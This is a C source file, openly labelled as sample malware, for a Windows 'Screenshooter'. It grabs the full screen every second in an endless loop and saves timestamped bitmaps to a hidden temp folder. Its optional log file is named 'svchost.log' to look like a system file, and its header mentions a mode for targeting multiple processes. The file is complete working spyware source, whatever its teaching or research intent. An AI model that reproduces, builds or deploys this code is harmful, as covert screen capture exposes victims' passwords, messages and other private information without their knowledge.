/*-------------------------------------------------------------------------------------------------
 *
 *      Sample Malware: Screenshooter
 *      Function      : Take screenshots periodically and store in %TMP%\shots\
 *      Note 1        : Some of the GDI APIs should be made from the same process
 *                      The malware is designed such that in BBS mode,
 *                      all the GDI dependencies will be met.
 *                      Thus, BBS mode should be used when targetting multiple processes 
 * 
 *-----------------------------------------------------------------------------------------------
 *
 *        Best built in Visual Studio 10
 *          Porject settings (Configuration Properties):
 * 
 *              1. C/C++ --> Advanced --> Calling convention
 *                 Set __stdcall (Gz)
 * 
 *              2. C/C++ --> Code Generation --> Buffer Security Check
 *                 Set NO
 * 
 *              3. Linker --> General --> Enable Incremental Linking
 *                 Set NO
 * 
 *              4. Linker --> System --> SubSystem
 *                 Set CONSOLE
 *
 *-----------------------------------------------------------------------------------------------*/

#include<Windows.h>
#include<direct.h>

//#define __DEBUG__

#ifdef __DEBUG__
    #define LOG(x, y) log(x, y)
#else
    #define LOG(x, y) ;
#endif

void log(const char* msg, DWORD err){
    char file_name[100];
    GetTempPathA(100, file_name);
    strcat(file_name, "shots\\svchost.log");
    HANDLE logFile = CreateFileA(
                                file_name,
                                FILE_APPEND_DATA,                     // open for writing
                                FILE_SHARE_READ | FILE_SHARE_WRITE,   // allow multiple readers
                                NULL,                                 // no security
                                OPEN_ALWAYS,                          // open or create
                                FILE_ATTRIBUTE_NORMAL,                // normal file
                                NULL);     
    SetFilePointer(
                logFile,                                              // file name
                0,                                                    // offset
                0,                                                    // offset
                FILE_END);                                            // offset reference point
    char error[250];
    DWORD dwBytesWritten;
    wsprintfA(error, msg, err);
    WriteFile(logFile, error, strlen(error), &dwBytesWritten, NULL);
    FlushFileBuffers(logFile);
    CloseHandle(logFile);
}

void setFileName(char *path, char *fpath){
    SYSTEMTIME tNow;
    GetLocalTime(&tNow);
    wsprintfA(path, fpath, tNow.wDay, tNow.wMonth, tNow.wYear,
                                    tNow.wHour, tNow.wMinute,
                                    tNow.wSecond, tNow.wMilliseconds);
}


void setBitmapFileHeader(BITMAPFILEHEADER *bmfHdr, DWORD dwPaletteSize, DWORD dwBmBitsSize, DWORD *dwDIBSize){
    (*dwDIBSize) = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;
    (*bmfHdr).bfType = 0x4D42; // "BM"
    (*bmfHdr).bfSize = (*dwDIBSize);
    (*bmfHdr).bfReserved1 = 0;
    (*bmfHdr).bfReserved2 = 0;
    (*bmfHdr).bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;
}


int SaveHBITMAPToFile(
        char* fpath,
        LPBITMAPINFOHEADER lpbi,
        WORD wBitCount,
        DWORD dwPaletteSize,
        DWORD dwBmBitsSize){

    char path[MAX_PATH];
    setFileName(path, fpath);

    HANDLE fh = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    if(fh==NULL){
        return 1;
    }

    BITMAPFILEHEADER bmfHdr;
    DWORD dwDIBSize;
    setBitmapFileHeader(&bmfHdr, dwPaletteSize, dwBmBitsSize, &dwDIBSize);

    DWORD  dwWritten;
    WriteFile(fh, (LPSTR)&bmfHdr, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);
    WriteFile(fh, (LPSTR)lpbi, dwDIBSize, &dwWritten, NULL);
    if(!CloseHandle(fh)){
        return 2;
    }
    
    return 0;
}

WORD getBitCount(int iBits){
    if (iBits <= 1)
        return (WORD)1;
    else if (iBits <= 4)
        return (WORD)4;
    else if (iBits <= 8)
        return (WORD)8;
    else
        return (WORD)24;
}

void createFilesFormat(char* path){
    char *folder = "shots\\";
    char *nameFormat = "%2d-%2d-4%d - %2d-%2d-%2d-%3d.bmp";
    GetTempPathA(MAX_PATH, path);
    strcat(path, folder);
    _mkdir(path);
    strcat(path, nameFormat);
}

void getDeviceDiamensions(int *width, int *height, int *iBits){
    HDC tmpDC = GetDC(NULL);
    *width = GetDeviceCaps(tmpDC, HORZRES);
    *height = GetDeviceCaps(tmpDC, VERTRES);
    *iBits = GetDeviceCaps(tmpDC, BITSPIXEL) * GetDeviceCaps(tmpDC, PLANES);
    ReleaseDC(NULL, tmpDC);
}

void setBitmapHeader(BITMAPINFOHEADER *bi, WORD *wBitCount, int iBits){
    (*wBitCount) = getBitCount(iBits);
    (*bi).biSize = sizeof(BITMAPINFOHEADER);
    (*bi).biPlanes = 1;
    (*bi).biBitCount = (*wBitCount);
    (*bi).biCompression = BI_RGB;
    (*bi).biSizeImage = 0;
    (*bi).biXPelsPerMeter = 0;
    (*bi).biYPelsPerMeter = 0;
    (*bi).biClrImportant = 0;
    (*bi).biClrUsed = 256;
}

/* --------------- MAIN ------------------------------------------------*/
int main(){
    /* ----------- Prepare file path template --------------------------*/
    char fpath[MAX_PATH];
    createFilesFormat(fpath);

    /* ----------- Variable Definitions --------------------------------*/
    LPBITMAPINFOHEADER lpbi;
    BITMAPINFOHEADER bi;
    DWORD dwPaletteSize = 0, dwBmBitsSize = 0;
    HANDLE hDib, hPal, hOldPal2 = NULL;

    lpbi = (LPBITMAPINFOHEADER) VirtualAlloc(NULL, 7000000, MEM_COMMIT, PAGE_READWRITE);
	//											   6220854

    /* ----------- Fetch constants -------------------------------------*/
    int width, height, iBits;
    WORD wBitCount;
    getDeviceDiamensions(&width, &height, &iBits);
    setBitmapHeader(&bi, &wBitCount, iBits);

    while(true){
        /* ------------- Prepare to take screenshot ------------- */
        /* We need all the GDI object creation, handling, destruction in the same chunk
         * to make sure that the same process handles them
         * [!] GDI Handles cannot be shared
         */

        // HDC hScreenDC = CreateDCA("DISPLAY", NULL, NULL, NULL);      // Create Device Context of Screen
        HDC hScreenDC = GetDC(NULL);                                    // Create Device Context of Screen

        HDC hMemoryDC = CreateCompatibleDC(hScreenDC);                  // Create DC in Memory
        HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
        HBITMAP hOldBitmap = (HBITMAP) SelectObject(hMemoryDC, hBitmap);
        BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
        hBitmap = (HBITMAP) SelectObject(hMemoryDC, hOldBitmap);
        __declspec(align(4)) BITMAP bitmap;
        GetObject(hBitmap, sizeof(bitmap), (LPVOID)&bitmap);

        bi.biWidth = bitmap.bmWidth;
        bi.biHeight = -bitmap.bmHeight;
        dwBmBitsSize = ((bitmap.bmWidth * wBitCount + 31) & ~31) / 8
            * bitmap.bmHeight;

        *lpbi = bi;

        hPal = GetStockObject(DEFAULT_PALETTE);
        hOldPal2 = SelectPalette(hScreenDC, (HPALETTE)hPal, FALSE);

        GetDIBits(hScreenDC, hBitmap, 0, (UINT)bitmap.bmHeight,
                    (LPSTR)lpbi + sizeof(BITMAPINFOHEADER) + dwPaletteSize,
                    (BITMAPINFO *)lpbi, DIB_RGB_COLORS);

        SelectPalette(hScreenDC, (HPALETTE)hOldPal2, TRUE);
        RealizePalette(hScreenDC);

        DeleteObject(hBitmap);
        DeleteObject(hOldBitmap);
        ReleaseDC(NULL, hScreenDC);
        DeleteDC(hMemoryDC);

        SaveHBITMAPToFile(fpath, lpbi, wBitCount, dwPaletteSize, dwBmBitsSize);

        Sleep(1000);
    }

    return 0;
}